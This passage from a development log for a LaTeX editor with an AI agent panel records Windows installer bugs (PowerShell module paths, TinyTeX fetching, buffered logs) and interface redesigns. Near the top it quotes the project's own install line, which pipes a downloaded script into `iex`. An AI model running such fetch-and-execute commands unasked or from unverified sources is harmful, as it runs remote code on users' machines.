the only one on its machine, and a badge reading "the normal one" is noise.

### The install line that stopped on its own options

Reported from a Windows machine, one line in: `irm ... /install.ps1 | iex`
answered with "the attribute cannot be added because variable Tex with value
would no longer be valid", and nothing was installed.

`iex` has no script file to bind parameters against. It runs the `param`
block in the caller's scope, where each entry becomes a variable with an
attribute attached rather than a parameter with a default, and a
`ValidateSet` that forbids its own default is then an attribute that cannot
be applied to the value sitting in the variable. `-Tex` was simply the first
of three.

What makes it worth writing down is that it held for months by accident. The
only validated option used to be `-Bind`, and its default was `localhost`,
which is a member of its own set. Adding `-Tex` and `-Agent` and giving all
three an empty default broke a rule nobody knew was being kept. The empty
string is now a member of each set, since the empty string is what "not
answered yet" means here.

The check for it lives in the cross-platform tests rather than the
PowerShell ones, because the PowerShell tests skip on the machine this is
written on and this is a Windows-only failure. A `pwsh` test runs the real
prologue too, in CI, with everything after the `param` block cut off so that
testing the install does not perform one.

### Two more things the same Windows machine found

With the options fixed, that install ran to the end and printed a URL, and
two of its steps had failed on the way past without stopping it.

**TinyTeX ships a wrapper that cannot work.** We fetched
`install-bin-windows.bat`, which is four lines whose entire job is to fetch
`install-bin-windows.ps1` and run it. It fetches it with `curl.exe -fsSLO
'https://...'`, and cmd.exe does not strip single quotes, so curl was handed
a URL starting with one and answered "URL using bad/illegal format". The
next line then ran a script that had never been downloaded, and the line
after deleted it. Three errors, no TeX, and the install carried on. Nothing
here can repair somebody else's batch file, so we now fetch the script it
was reaching for.

**One cmdlet cost the whole interface.** `fetch-interface.ps1` stopped on
"the term 'Get-FileHash' is not recognized", which is what a `powershell`
older than 4.0 says. It had already downloaded the tarball and the
checksum, because `Invoke-WebRequest` is 3.0, and everything else in the
script is 3.0 as well: one call was holding the floor a version higher than
the rest of it. The .NET SHA256 class underneath is available wherever this
runs, so the checksum is computed from that instead, and the check itself
stays required rather than becoming advisory on old machines.

The test for it is worth more than the fix. A hand-rolled digest is exactly
the kind of code that returns a plausible wrong string for ever, so the
`pwsh` test compares what the function produces against Python's `hashlib`
rather than checking that it ran. Alongside it, a plain Python test refuses
any cmdlet newer than 3.0 in any shipped script, since that is a rule the
next person would otherwise have to know.

What neither of them can fix is the third failure in that log: Anthropic's
own `install.ps1` stopped on the same missing cmdlet. An old `powershell` is
a real thing on real machines, and the only honest thing to do about
somebody else's script is to say so.

### The cmdlet that was there, on a machine that could not see it

The previous entry got the cause wrong, and the way it was wrong is worth
keeping. `Get-FileHash` was missing from the install log, `Get-FileHash`
arrived in PowerShell 4.0, so the machine was old. It was not old. It runs
Windows 11 with PowerShell 7.6.5 and Windows PowerShell 5.1 side by side,
and both have the cmdlet. One missing name had been read as a version
number.

What is actually happening is that the two PowerShells use the same
variable, `PSModulePath`, for different directories. The install line is
typed into pwsh 7, so pwsh 7's module path is inherited by our Python
installer, which passes it to the `powershell.exe` it starts. 5.1 then sees
two copies of `Microsoft.PowerShell.Utility`, PowerShell 7's sorting first
because `c:\program files\powershell\7\Modules` comes before the
system32 entry, imports that one, and `Get-FileHash` is not in what it
exports.

It was settled by spawning the same child three times with only that one
variable changed: inherited, the cmdlet was missing; removed, present;
forced to 5.1's own value, present. Removing is what we do, because
PowerShell rebuilds its default when the variable is absent, so nothing
here has to know the right value for a machine it cannot see.

Three details in that finding are worth more than the fix.

**The bug is invisible by hand.** A `powershell.exe` started directly by
pwsh 7 gets a clean 5.1 module path; the pollution only arrives through an
intermediary that is not itself PowerShell. So anyone reproducing this at a
prompt sees it work, and only the installer fails. That is why it survived
three installs and two wrong diagnoses.

**`os.environ` upper-cases its keys on Windows.** `env.pop("PSModulePath")`
therefore removes nothing while looking exactly like it worked, and a first
attempt at the fix produced a convincing false negative. The comparison has
to be case-insensitive, and the test uses an upper-case key for that reason
alone.

**Three spawn sites, not one.** The installer's `Console.run` is the one
place the *install* starts a child, which is the whole design of that
module, and it is easy to read that as the only place anything is started.
It is not. The settings sheet starts the Claude CLI installer on its own,
and the in-app update button starts the updater from the server, which
inherits its environment from whatever launched the server. The first two
were corrected together; the third was found by somebody reading the fix
rather than the bug, which is the better time to find it.

The first attempt at guarding that was worse than nothing, and the way it
was wrong is the part worth keeping. It named the three files, asserted that
each mentioned `child_env` somewhere, and skipped those three in the sweep
over everything else. Both halves were weak in the same direction: the
assertion passes on an import line, and the exemption means the three files
most likely to grow a fourth spawn were the three least protected. A guard
that is inverted like that is worse than an absent one, because it reports
that the rule is being kept.

What replaced it asserts on the call rather than the file. The test parses
each source file, finds the calls that start a process, and requires
`env=child_env(...)` on every one that sits in a function naming PowerShell,
with no file exempted; the three known sites are additionally named by
function and checked call by call. The list of spawning names is wider than
what the code uses today, because the rule is about what somebody reaches
for next.

It was then checked by breaking it: with the correction deleted the guard
fails, with a fresh PowerShell spawn added inside an already-listed file it
fails, and with both restored it passes. A test written to catch a mistake
that has already been made should be made to catch it once, or it is only a
claim.

### An interactive test that was not one

Found in the same pass, on the same machine. `Test-Interactive` gated the
directory prompt on `[Environment]::UserInteractive`, which tracks the
window station rather than the keyboard: it reports true inside a child
started with its input on the null device, which is precisely where
`Read-Host` waits for an answer that can never arrive. Redirected input is
the part that means nobody can type, and it stays false in a real console
even for `irm | iex`, so both are checked now.

### An install that said Ready and had skipped the step that mattered

The verification run succeeded in sixteen seconds and exposed a different
bug on the way past, which is the best thing a verification run can do.

It ended with a note saying there was no tlmgr, so latexmk, biber, synctex,
chktex and texcount were still missing and a project using them would not
build. Both halves were false. `tlmgr.bat` and `latexmk.exe` were sitting in
a directory the installer had printed on screen two lines earlier, under
"already here".

TinyTeX does not put its bin directory on PATH. The installer knows this and
has a function to fix it, and that function was called in exactly one place:
the branch where TinyTeX had just been installed. A machine that already had
TeX skipped the whole block, so PATH was never corrected, and the question
four lines later was a bare `shutil.which`, which answered no to everything.
The install then skipped the step that would have added the four that were
genuinely absent, and exited successfully.

The irony is in the comment above that question. It explains, correctly,
that the survey's answer is stale on a fresh machine and so the question is
asked again. The survey asks it properly, consulting the TeX directory as
well as PATH. The re-ask asks it badly. Fixing the staleness had quietly
dropped the directory-aware half, which is the third time in this
investigation that one idea existed in two places and the second one was the
one that ran.

So there is now one `tex_tool` in `survey.py` that both callers use, PATH is
corrected before anything asks what is installed rather than only where
something was installed, and the five tool names live in one tuple. The
suffixes matter too: TinyTeX ships `tlmgr.bat` next to `latexmk.exe`, and
the old survey code checked `.bat` for one and `.exe` for the other.

**Why this one is worse than a crash.** It fires only when TeX is already
present, so it cannot happen on a first install and must happen on every
one after that. The person is told the install worked. They find out it did
not days later, when a build fails, with nothing to bring back. A failure
that reports success is not a smaller bug than one that stops; it is the
same bug with the evidence removed.

### Detection and execution disagreeing about one word

Fixing the previous bug unblocked the step it had been skipping, and the
step failed immediately:

    Adding biber, synctex, chktex, texcount  FAILED
      [WinError 2] The system cannot find the file specified

On a machine where tlmgr was present, working, and had just been detected.
`shutil.which("tlmgr")` returns `tlmgr.BAT`, because it honours PATHEXT.
`subprocess` without a shell goes to `CreateProcess`, which appends only
`.exe` to a bare name and cannot find a `.bat`. The installer ran
`["tlmgr", "install", ...]`, so it asked one function where the tool was,
threw the answer away, and asked a different function to run the name.

That is the third appearance of the same shape in one afternoon. A bare
`shutil.which` that could not see the TeX directory. A `which` bound too
early in a default argument to be replaced. And now a resolved path
discarded in favour of the string it was resolved from. In all three the
code contains the right question and something between the question and the
answer makes it unaskable, which is why they read as correct.

So `tex_tool` returns the path rather than a boolean, and
`install_tex_extras` takes that path with no default, because a default of
`"tlmgr"` is the bug wearing a hat. Twenty-six lines below it, the npm step
already read `shutil.which("npm") or "npm"`: npm is `npm.cmd` on Windows and
somebody had met this before, in the same file, without the lesson reaching
the function above.

**Windows-only, which is why it lasted.** On Linux and macOS `tlmgr` is an
extensionless executable and the bare name resolves, so every test and every
developer install was blind to it. The test now stubs a `.BAT` path
deliberately: a stub returning a bare name would pass whatever the code did,
which makes it a test of nothing.

### A refusal that arrived as a success

Reported from Windows: clicking Sign in with Claude showed "Starting..." and
then nothing, for ever.

The server was not silent. `start_login` checks for a pseudo-terminal, finds
none on Windows, and answers with a sentence naming both ways out: run
`claude auth login` in a terminal once, or use an OpenAI key. It answers with
HTTP 200 and `{ok: false, error}`, because a refusal is not a server fault.
The sign-in pane awaited that call inside a `try`, caught nothing, and went
straight on to open an event stream for a login that had never started. The
one screen that could have shown the explanation was the one that discarded
it.

So the shape of the bug is a status code and a body disagreeing, and the
caller believing the status code. It is the same family as the rest of this
chapter: `shutil.which` and `CreateProcess` disagreeing about a name, a
survey and an installer disagreeing about what "installed" means. Two
answers to one question, and the code consulting whichever is easier to
reach.

The check lives in `loginRefusal` rather than inline, so it can be tested
without rendering a React tree, and so that the rule has a name. A caller
that only catches exceptions is not reading the whole answer.

### A hidden window that reported nothing

The last of the Windows run, and the one that took longest to see because
there was nothing to see. The installer started the server with
`pythonw.exe`, chosen so that logging in did not leave a black rectangle on
the desktop. It does achieve that. It also discards stdout and stderr
entirely, so a server that died on startup died in silence: no window, no
message, no file. The installer printed "started", then "Ready", then a link,
and the browser said the site could not be reached.

`python.exe` runs it now, the window is minimised rather than absent, and
everything it writes goes to `server.log` and `server.err.log` beside the
install log. A minimised window that reports is worth more than a hidden one
that cannot.

That was checked on the machine it was written for, and the check found the
next thing. The server was up, the port was serving, the shortcut had been
rewritten, and both log files were nought bytes after an hour. Not a
redirect failure: Python block-buffers stdout when it is a file rather than
a console, so a process that stays up writes nothing into it however much it
prints, because the buffer never fills and it never exits to flush. Measured
both ways rather than argued: after three seconds a live child's stdout file
was empty and its stderr file was not, and with `-u` the banner was there at
once. So the launcher passes `-u`, on the shortcut as well as the immediate
start.

The reason it matters is that emptiness is what a person reads that file
for. Unbuffered, empty means it never got there. Buffered, empty means
nothing at all, and the success message was naming that file by name while
the installer's failure note named the other one. The reassuring message
pointed at the file that could not contain anything.

**And the installer now checks the address before it prints it.** Printing a
link is not the same as there being something at the end of it, and that step
had never looked. So on an install that undertook to start the server, the
port is polled until it answers or twenty seconds pass, and a silence becomes
a note naming the log rather than a link that fails in the browser a moment
later. Only where the install said it would start something: somebody who
declined that has nothing running on purpose.

That check is the general form of most of this chapter. Every bug here was a
success reported without being verified: an install that skipped tlmgr and
said Ready, a sign-in refusal read as a start, a launch that printed
"started" into the dark.

### An install that succeeded, reported as a failure

From a second Windows machine. The in-app Claude setup ended in red, saying
the CLI had not installed. The installer's own output was still on the screen
above it: "Claude Code successfully installed", version 2.1.267, location
`C:\Users\<name>\.local\bin\claude.exe`. It had installed perfectly.

Between those two messages is a warning the official installer prints, and it
is the whole story: the directory it wrote to is not on PATH, and it asks the
person to add it by hand through System Properties. So the ordinary outcome
of a successful Windows install is a CLI that exists and that `shutil.which`
cannot see. Our fallback looked for `~/.local/bin/claude` with no extension
and missed `claude.exe`, which is the same mistake as running `tlmgr` by a
name Windows cannot resolve: found by the eye, missed by the code.

The second half is worse and would not have shown up until later. The SDK
that actually runs the agent does its own lookup, on PATH, and we had never
told it what we found. So even with detection fixed, the agent would have
failed to start on the machine where the setup screen had just reported
success. `cli_path` now carries the answer across, and there is one resolver
rather than two opinions.

This is the same shape as the rest of the Windows run: two ways of asking
where something is, and the code taking the one that is easier to reach.

### Something to double-click

Asked for directly: a shortcut on the desktop after a successful install, on
every platform, and on Linux only where there is a desktop to put one on.

**It launches rather than bookmarks.** The obvious shortcut is the URL the
installer prints, and it is the wrong one. That URL carries the access token,
so a file on the desktop becomes a second copy of it; it goes stale the
moment the port or the token changes; and it does nothing at all when the
server is not running, which is exactly the state somebody double-clicks in.
So all three platforms run `server/run.py --open`, which reads the
configuration, opens the browser if the port already answers, and otherwise
starts NextTex and opens the browser once it does. One source of truth, and
it works from both states.

Waiting for the port rather than sleeping first: opening the browser
immediately shows a connection error on a cold start, and a fixed delay is a
guess about how long an interpreter takes on somebody else's machine.

**Three files, because three platforms disagree.** A `.desktop` entry with
`Terminal=false` on Linux, a `.command` on macOS, and a `.lnk` on Windows
written from PowerShell, because a `.lnk` is a COM object and because
`GetFolderPath('Desktop')` is the only thing that knows where the desktop
really is once OneDrive has moved it. `XDG_DESKTOP_DIR` is consulted first on
Linux: a desktop called `Skrivebord` with an empty `~/Desktop` beside it
would otherwise get the shortcut in the one nobody looks at.

**It is on the plan, and that is the point.** The plan screen ends with
"Nothing outside this directory is written", and that sentence is most of why
anybody trusts the screen above it. A file appearing on the desktop under it
would make it false, so the shortcut is a seventh item somebody can decline,
and the promise names it when it is going ahead.

The subtle half of that was a fixed item still reporting its default. On a
headless machine the item reads "no desktop on this machine, so there is
nowhere to put one" while `choice()` went on answering "yes", so the plan
promised a shortcut that was never going to be written. Fixing the text
without moving the default would have left the screen lying in a quieter way
than before.

## 19. Navigating a long document, and where the agent's controls belong

Three changes, all of them about a project that has grown past the size the
first design assumed: a rail that could only list files, an agent header with
five things in it, and a panel that had to be folded by hand.

### The rail is a stack of panels, and Files is one of them

The rail held one thing that could not fold, the file tree, and three that
could: the trash, the papers, and what the agent reads. (Git was a fourth
that could not, and it is a panel like the others now, see the end of this
document.) That was right when a project was a handful of files. It stops being right the moment a
document is long enough that finding a section matters more than finding a
file, because the tree then occupies the whole rail to answer a question
nobody is asking.

So **Files becomes a panel like the others**: a 26px header with a label and a
chevron, in the same idiom as `TrashPanel`. It keeps `flex-1` when open, so
nothing about the ordinary arrangement changes. Folded, it gives its height to
Sections.

The tree is **unmounted when folded rather than hidden**. It owns a 700ms
type-ahead and a roving tab stop, and both would still answer the keyboard
from behind a closed panel, a key press that jumps a list you cannot see is
worse than one that does nothing. The cost is that the tree's expanded
folders reset when it comes back; that state was never persisted across a
reload either, so this loses nothing that survived a refresh.

### Sections reads the source, not the .toc

LaTeX already writes a table of contents, into `main.toc`. Using it was the
obvious first thought and the wrong one: a `.toc` exists only after a
successful build and describes the document as it was when that build
started. A writer adding a section wants it in the outline while they are
still typing the title, not one compile later, and a document that does not
currently compile would have no outline at all, which is exactly when
navigating it is hardest.

`frontend/src/outline.ts` therefore parses the buffer. It scans once with an
index rather than matching per line, because three things fall out of that for
free: a title can run across lines, a `%` can hide a heading, and a
`verbatim` block can contain something shaped like one. Line numbers stay
exact, which is what the jump needs.

`\include` and `\input` are listed alongside the sectioning commands and sit
at chapter depth, because **in a skeleton document they are the outline**. A
dissertation's `main.tex` contains no prose and eight `\include` lines; its
table of contents is that list. Clicking one opens the file it names,
resolved against the main file's directory rather than the including file's,
which is how LaTeX itself resolves it.

The outline is recomputed on a 250ms timer behind the keyboard. That timer
used to be the autosave's, and the outline was deliberately refreshed
*before* the save, so that a file whose save was refused did not show the
outline it had when it was last written for as long as the conflict stood.
There are no refused saves any more (§22) and the timer is now only about not
re-parsing a long chapter on every keystroke. `sameOutline` compares the
result and keeps the old array when nothing moved, so typing prose does not
re-render the panel.

The row under the caret is marked with `aria-current` and a small dot rather
than a rule or a heavier weight: the mark moves as the writer types, and a
mark that changes a row's size would shift every row below it several times a
minute. Above the first heading nothing is marked, because that is a real
place to be in a file and not a reason to point at the first section.

### The agent's controls moved under the box

The chat header is 32px and carried the name, what the agent is doing, the
Auto chip, Stop, the usage tally, an overflow menu and a fold chevron. Seven
things in a bar that narrows to 280px is four too many, and the overflow menu
was where the crowding had already been swept.

New conversation, model and auto mode are now **icons in a row under the
composer**, beside Send, with "Template and voice" joining them. Every one of
them is something you reach for while writing the question, so under the box
is where the hand already is; and the row costs no more width than the single
text button it replaces.

Two rules held while moving them:

- **The Auto chip stays in the header.** The icon is the *toggle*; the chip is
  the *state*. A mode that disables the permission fence and survives a
  restart has to be visible without opening anything, and the header is the
  part of the panel that is always on screen.
- **The confirm still asks in place.** "New conversation" opens its two
  buttons above the composer rather than in a dialog, in the same idiom as
  the setup block, so the sentence has room to say that the record is kept.

The icons are five hand-drawn paths at 13px. An icon set would have been
faster to write and would have cost tens of kilobytes on a bundle with about
24kB of headroom.

The model popover opens upward from its button and dismisses through the
anchor-aware `useDismiss`: the same hook, with the same trigger ref, that
the usage panel needed. Any new toggle popover in this app must pass its
anchor or it will close on `pointerdown` and reopen on `click`.

Since the backlog run the model menu, the mode menu and the template-and-
voice panel arrive on first open rather than with the panel: they are one
lazy chunk, `ComposerMenus.tsx`, and the strip's buttons stay where they
were. Two things follow. Each panel puts focus on its own first choice
when it mounts, because an effect in the parent keyed on the opening runs
before the chunk has arrived and finds nothing to focus; and the words the
bolt's aria-label reads live in `mode-words.ts`, on the entry side, so the
label is right before the menu that lists them has been fetched.

### Several previewed documents

A project builds one document per previewed file rather than one per
project. `esi.tex` beside `main.tex` is the case: two documents in one
folder, neither including the other, and before this the only way to build
the second was to make it the main file and change it back.

Three things had to become per-document that were per-project: the preview
stand-in (now named after its document and written beside it, which is what
the compiler's module docstring always said it needed), the scope marker
recording whether a PDF is whole or an `\includeonly` slice, and the
scheduler with its own idea of whether the next build must be a full one.
Jobname collisions are refused with a 409 rather than worked around: two
documents whose stems match would each serve the other's page, and a build
directory per document would move `main.pdf` and break every Makefile
pointed at it.

**What rebuilds on a save is decided by `nexttex/deps.py`**, which follows
`\input`, `\include`, `\subfile`, `\includestandalone`, `\import`,
`\bibliography` and `\includegraphics`. Its two fallbacks are asymmetric on
purpose: an unrecognised `.tex` goes to the first document only, because the
usual unknown is a file just created and not yet included anywhere; an
unrecognised asset goes to every document, because under-attributing one
leaves a preview that silently stops updating.

**Builds queue rather than run together**, one at a time across the project,
with the visible tab first. Each scheduler already serialises itself, but two
`latexmk` runs in one build directory would write over each other's
`.fdb_latexmk` and biber temporaries. There is no preemption: a running build
is never abandoned for a newer one of a *different* document, and superseding
a build of the *same* document happens before the queue is joined, a request
that queued first would otherwise wait for a slot held by the build it means
to replace.

Below 900px the preview has no header of its own, so the strip shares the
row that carries the source/preview toggle. Without that there was no way to
change document with a mouse at that width: the same hole the agent button
had, in the same place, for the same reason: a control that lives in a pane
disappears with the pane.

### Text on the page can be selected

The preview was a canvas, so the page was a picture: it could not be
selected, searched or copied out of, which for a document somebody is quoting
from is most of what a PDF is for. Each page now carries a `pdf.js` text
layer, transparent spans positioned over the glyphs, built only for pages
on screen and only once per page per build.

Held to the pinch benchmark, which is the thing that could have made this a
bad trade. Over sixty wheel events in twenty frames: layouts stay at 40, the
number that mattered, and the whole gesture costs about 3.8 ms more in style
and script, under 0.2 ms a frame. During a zoom the layer is transformed
rather than rebuilt, because rebuilding several hundred spans per frame is
precisely the cost the coalescing handler exists to avoid; without it a
selection made mid-gesture would land a word out.

Pointer events pass through the layer and are taken only by its spans, so the
double-click that jumps to the source still reaches `.nx-page` beneath it.

### One shortcut, and why it is not Super-A

The agent panel is two different things depending on width: below 1400px an
overlay that slides over the preview, above it a column that folds. One
shortcut has to do whichever is on screen, and opening it puts the caret in
the box, a shortcut that opens a panel you then have to click into has saved
nobody anything.

Super-A was asked for and is not available. On Linux the window manager takes
Super before the browser sees it; `Cmd/Ctrl-A` alone is Select All, which an
editor cannot give up; `Cmd/Ctrl-Shift-A` is Chrome's own tab search; and
`Cmd/Ctrl-/` is CodeMirror's toggle-comment, bound by `defaultKeymap`. **The
binding is `Cmd/Ctrl-Alt-A`**, which keeps the A, the part worth keeping,
and is free in both keymaps and both browsers. It is read from `event.code`
rather than `event.key`, because with Alt held macOS reports the character
the combination would type.

**Escape closes it from inside it, and never opens it.** Scoped rather than
global, and the first attempt was global: Escape is also how a keyboard gets
out of CodeMirror, where Tab indents rather than moving on, so a binding
that listened everywhere shut the panel every time somebody pressed Escape
to tab away from the editor, and the accessibility spec that tabs from the
editor to the composer caught it. Escape dismisses the thing you are in,
here as everywhere else in the app. The pairing with `Cmd/Ctrl-Alt-A` still
holds, because that shortcut leaves the caret in the composer.

Two things still have to be true. The tutorial and the context sheet own
Escape while they are open, and close themselves; the history panel, which
can be docked beside the editor and covers nothing there, answers it only
while the keyboard is inside it (§43). And a
popover *inside* the panel claims it by preventing the default: a claim not
visible synchronously, since window listeners run in the order they were
added and those components mount long after the shell, so the decision waits
a turn and then reads `defaultPrevented`.

### One way to the agent, floating in the corner

The agent used to be reached by two controls that were never both present: a
vertical strip at the right edge above 1400px, and a button in the editor's
tab row below it. That button lives inside the editor pane, which is hidden
when the source is folded away and when the preview has the window below
900px: **so in two ordinary layouts there was no way to reach the agent with
a mouse at all**, only `Cmd/Ctrl-Alt-A`. Both e2e cases now exist.

One control instead, in the shell rather than in any pane, in the same corner
whatever the layout is doing: a floating pill above the chat overlay's `z-30`
and below the tutorial's `z-40`, clear of the 26px preview footer and of the
centred toasts. It travels left by the panel's width when the panel is
docked, so the panel never covers the thing that closes it.

It carries the provider's mark rather than its name alone, drawn as geometry
rather than traced: a trademark reproduced badly from memory looks worse
than no logo, and the name is beside it either way. On the mark sits a state
dot fed by `thinking` and `awaitingPermission`. That dot earns its place:
*the agent is waiting for you to allow something* was invisible whenever the
panel was closed, which is precisely when it needed saying. It breathes
rather than spins: a turn can run for a minute, and something spinning for a
minute reads as an error long before it reads as progress.

*Revised, 19 September 2026, in the visual overhaul.* The pill no longer
floats in every layout. It shows in one state only: the column is an
overlay (below 1400 shell pixels) and is parked, when nothing else on
screen stands for it. While the column is open, in either form, its own
fold control closes it, and a second control for the same act was one more
thing to hold in mind; so the pill is not in the document then, and the
`right` offset that moved it aside by the panel's width is gone with it.
While the column is docked and folded, a `Collapsed` strip labelled Claude
stands at the right edge, as the Source and Preview strips stand for their
panes, and it carries the same state dot (`AgentStateDot`, exported from
`AgentButton.tsx`) so that *the agent is waiting for you* survives the
fold. `layout.spec.ts` pins the three states in one case. The three
screenshots under `docs/` still show the pill beside a docked column; they
are regenerated at the end of the overhaul.

### The rail scrolls rather than pushing its panels out

Every expanded panel in the rail is `shrink-0`, which is right: a list
squeezed to two rows is worse than one you scroll to. But the column had no
answer for their natural heights adding up to more than the rail is tall, and
the lower ones were simply pushed out of the pane: on a fourteen-chapter
project at 700px, "What Claude reads" sat 184px below the bottom with no way
to scroll to it. The stack is now its own scroll container. `min-h-0` matters
as much as the overflow: a flex child will not scroll until it is allowed to
be shorter than its content.

### Reaching for the preview puts the overlay away

Below 1400px the panel lies over the preview, and the click that means "let me
read this" was leaving it covered. A `pointerdown` on the preview pane now
closes the overlay, `pointerdown` rather than `click` so it lands before the
preview header's own single/double-click timer and never turns a fold into a
mode change, and nothing is prevented, so the click still reaches the page.

Only when the panel is actually covering something. Docked, above 1400px,
clicking the preview does nothing to it: a panel that vanished on every click
into the document would be unusable.

While the specs for this were being written, the same double click that
enters reading mode was found to leave the project. The preview header shows
the project controls in place of its own label once the rail has folded away,
which in reading mode it always has, so the second half of the gesture landed
on "switch project". The controls moved to the right of the bar, beside the
fold chevron. The left of a header a writer double clicks has to stay inert.

### What the design review changed

Rendered at four widths in both themes and read against this document. Six
things it found, in the order they mattered.

**The auto-mode switch was never `--warn`, and turned `--hint` under the
pointer.** The icon carried `text-warn`, but `styles.css` is imported after
Tailwind and unlayered, so `.quiet { color: var(--ink-3) }` beats any colour
utility from `@layer utilities`. Worse, `.quiet:hover:not([data-tone])`
repainted it to `--hint` on hover: the one control that lowers the permission
fence turned the colour that means "safe and interactive" at the moment your
pointer reached it. The stylesheet's own comment names this exact failure for
a Delete control. The fix is the escape hatch already there: a new
`.quiet[data-tone="warn"]` beside `[data-tone="danger"]` and `[data-tone="on"]`,
and `data-tone` on the buttons instead of a utility class. Moving `.quiet`
into a layer would have fixed it and broken every other place the build
relies on that precedence.

**The two blocks that open above the composer were unreachable by keyboard.**
They render before the textarea and their triggers come after it, so Tab from
the trigger walked forward past them and never arrived. Both now take
`useDismiss` (which brings Escape and outside-press with it), move focus into
the block on open and hand it back on close. The new-conversation block
focuses "Keep this one" rather than "Start new": it ends a conversation, so
the default answer is no.

**Every section was a tab stop.** §10 records fixing precisely this for the
file tree, which is one stop with arrow keys rather than forty. The list now
does the same, with Home and End.

**An `\include` for a file that is not there did nothing, silently.** A
chapter not yet written is the normal state of a skeleton document, and a row
that hovers and answers nothing is worse than one that says so. Those rows
are drawn `--ink-3` and disabled, which also names the compile error coming
next.

**The preamble was heading the table of contents.** A dissertation's main.tex
loads `preamble/formatting` and `preamble/macros` with `\input` before
`\begin{document}`, so the outline opened with two rows of machinery. Includes
seen before the document begins are dropped, but only if the file begins one
at all: a chapter is included into something else and has no preamble to
separate, so everything it pulls in stays.

**Two spec deviations.** Rows were 24px against §4's 26, and indented by 11px
against §5's 13 -- which is the width of a lowercase *n* and the reason the
file tree indents the way it does. Both corrected, so the two lists in the
rail sit on one grid.

The caret row also took a `--surface-2` fill on top of its dot, which made it
the one row in the panel that did not answer the pointer. The dot carries it
alone, as this section said it should.

Left alone, deliberately: the model popover covers the composer while it is
open. Detaching it from its button to clear a half-written question would
read as a floating panel rather than a menu, and the draft is still there
when it closes. And folding Files takes the file actions with it, which is
the reachability hole `FileTree` argues against -- but the fold is explicit,
one click reverses it, and the alternative was to drop the panel header the
rail's whole new idiom rests on.

The rail's fold button still says "Fold the file list away" though the rail
now holds six panels. Renaming it collided with the agent panel's own "Fold
this panel away", which two specs address by name, and every unique
alternative left the button and the strip it folds into ("Show files")
reading as a mismatched pair. The file list is still the bulk of what is
there.

## 20. A tutorial that can be read while you use the thing it describes

The app explains itself well in places, the status strip names the first
error in English, the git panel offers a repository before you ask, the
welcome message says what the agent is for, but none of that adds up to an
answer to "what is this and how do I use it". `docs/first-session.md` is
that answer and it is not reachable from the app, which over Tailscale may
be running on a machine the reader does not have the repository on.

### It is a sheet, and it does not dismiss

The shape was the whole design question. Every dialog in this app is a small
anchored card, 248 to 320 px, and each one closes on an outside press. A
tutorial with eleven sections and six figures is an order of magnitude more
content than anything the app shows at once.

**A right-hand sheet, 380 px, full height, over the preview.** `History` is
the precedent: it is the one existing surface that is a full-height sheet
*and* the one surface that does not call `useDismiss`, so it stays open
while you click around the editor. That second property is the whole reason
it is the right model here. A tutorial whose third section says *"a single
click on a pane's header folds that pane away"* and then closes the instant
you try it is worse than no tutorial.

380 rather than History's 264 because body text at 13/20 inside 356 px of
measure is about 58 characters, inside §3's 68ch ceiling; at 264 the measure
is 40ch and a figure would be 240 px wide, below legibility for anything
containing interface text.

It never docks, and that is arithmetic rather than taste. At the 1400 px
breakpoint the rail and the agent already take 620 px, leaving 780 for an
editor and preview whose minimums total 740. A docked tutorial column would
need a window around 1800 px before it fit, so the flag would be dead code
at every width most people run.

It covers the preview because the preview is the one pane no section asks
you to touch: the rail's panel headers, the tab strip's empty run, the
gutter, the status strip, the composer's icon row and the git footer all
stay visible behind it. Below 1400 px the agent is itself an overlay over
the preview, so opening the tutorial puts it away, the same handoff, for
the same reason, that the preview pane already performs on a pointer press.
Closing the tutorial does not bring the agent back; `⌘⌥A` does, and the
tutorial's own shortcut table names that key two sections away.

Rejected, each for a reason particular to this app: a **centred modal**,
because §5 reserves modals for surfaces that are the whole of what you are
doing, and a tutorial about the layout is the opposite: it would cover the tab
strip, gutter and status strip that half the content points at; a **new
`view`**, because it would unmount the editor and throw away the layout the
reader is being taught about; a **rail panel**, because the rail auto-collapses
below 1100 px and cannot describe itself while covering itself; **disclosure
inside the settings**, because those are dismissed by an outside press, so the
first attempt to try a gesture would close them.

### One scrolling document, and an index one click from it

This is reference material as much as a first read, and both uses are served
by a single scrolling document ordered by when you meet each thing.

The index above it used to be a fixed block of every section. **That
arrangement set its own tripwire and then walked past it twice.** The
paragraph here said: "Nine rows at 26 px is what makes the block fixed
rather than scrolling, and a tenth section is the practical signal to cut
one instead." There are eleven sections. Nobody cut anything and nobody
re-read this, so 290 px of a 380 px sheet, a third of the surface, above
the fold, permanently, was an index of places a first-time reader has not
been yet.

It is one 30 px row now, and it does two jobs at once. Closed, it names the
section you are in, which is the other thing the old block did badly: the
mark was a 4 px dot at the end of a row, on the far side of the sheet from
the words it marked. Open, it is the same list it always was, and choosing
from it closes it again, because you asked to be somewhere rather than to
have a list.

**Still not an accordion**, and the distinction is the whole reason this is
allowed. What collapses is the index, not the document: every section stays
expanded, so Ctrl-F still finds every word, and the only text hidden by the
closed state is a list of links whose words are also the headings they point
at. Collapsing the *sections* would still be wrong for exactly the reason
recorded here before.

The row you are in is marked with a 2 px leading bar in `--pen`, which is
what the file tree, the history panel, the diagnostics list and the folder
chooser all use to say "this one", §19's argument against a fill still
holds and the bar was always the app's answer to it. One tab stop with arrow
keys, not eleven, for the reason §10 and §19 both give; opening the index
puts the caret on the section you are in, so the first arrow moves from where
you are.

**And the sections are numbered.** `Section`'s docstring has called them "one
numbered part of the tutorial" since it was written and nothing was numbered.
A number is only worth drawing when the thing really is a sequence, and this
one is: read top to bottom the first time, dipped into afterwards, which is
the shape a number serves. It also gives the closed row something exact to
say.

**Each section leads with the sentence it would give if it could give only
one**, set in `--ink` where the rest of the prose is `--ink-2`. Eleven
sections of three or four undifferentiated paragraphs in a 380 px column is a
wall; eleven leads is a page a reader can skim for the answer they came for.
It is the first paragraph promoted rather than a summary written on top of
one, a section whose opening sentence cannot carry it wants rewriting rather
than labelling.

### Figures

Six, in both themes, and the selection rule is what keeps it to six: **a
screenshot earns its place only if it shows an unlabelled target you cannot
otherwise point at, or a state that is not currently on screen.** The reader
is inside the app, so a picture of something visible and already labelled is
the least informative figure there is. That rule cuts the obvious first idea
: there is no overview shot of the four panes, because the reader is looking
at them.

What survives: the tab strip's empty run (invisible by definition), the
errors drawer (a state you cannot conjure without breaking your document),
an edit chip opened to its diff, a permission card, the composer's row of
unlabelled buttons, and the git card that is set aside once dismissed.

`prefers-color-scheme` is the wrong test for choosing between them. §2 is
explicit that the theme here is *"authored and chosen, not inherited"* and
stamped on the root; `e2e/shots/hero.spec.ts` already carries the scar from
assuming otherwise. The figures read `data-theme` and follow the
